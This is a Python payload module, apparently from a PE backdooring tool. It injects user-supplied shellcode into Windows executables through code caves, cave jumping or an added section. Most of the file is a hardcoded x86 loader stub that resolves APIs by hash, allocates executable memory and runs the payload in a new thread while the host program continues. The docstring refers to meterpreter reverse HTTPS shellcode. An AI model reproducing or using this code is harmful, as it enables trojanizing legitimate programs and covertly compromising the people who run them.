import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
logger = logging.getLogger(__name__)


class user_supplied_shellcode_threaded ():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "user_supplied_shellcode_threaded "
        self.description = """Provide your own PIE win x86 payload"""
        self.requirements = {'MODE':'How the patching will happen',
                             'SUPPLIED_SHELLCODE':'User suppled shellcode in raw format',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = b"\x90\x90\x60\x9c"
        self.stackrestore = b"\x9d\x61"
        self.apis_needed = None
        self.payload_type = 'staged'
        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()


    def run(self):

        """
        Traditional meterpreter reverse https shellcode from metasploit
        modified to support cave jumping.
        """

        #Begin shellcode 2:
        self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        if self.MODE.lower() == 'cave_jumping':
            self.shellcode2 = b"\xe8"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = b"\xE8\xB7\xFF\xFF\xFF"

        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 58

        self.shellcode2 += self.supplied_shellcode

        #shellcode1 is the thread
        self.shellcode1 = bytes("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90\xbe", 'iso-8859-1'
                           )

        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += b"\x00\x00"  # <---Size of shellcode2 in hex
        self.shellcode1 += bytes("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            "\x89\xF1", 'iso-8859-1'
                            )

        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x44"   # <--length of shellcode below
        
        self.shellcode1 += b"\x90\x5e"
        self.shellcode1 += bytes("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61", 'iso-8859-1'
                            )

        
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2
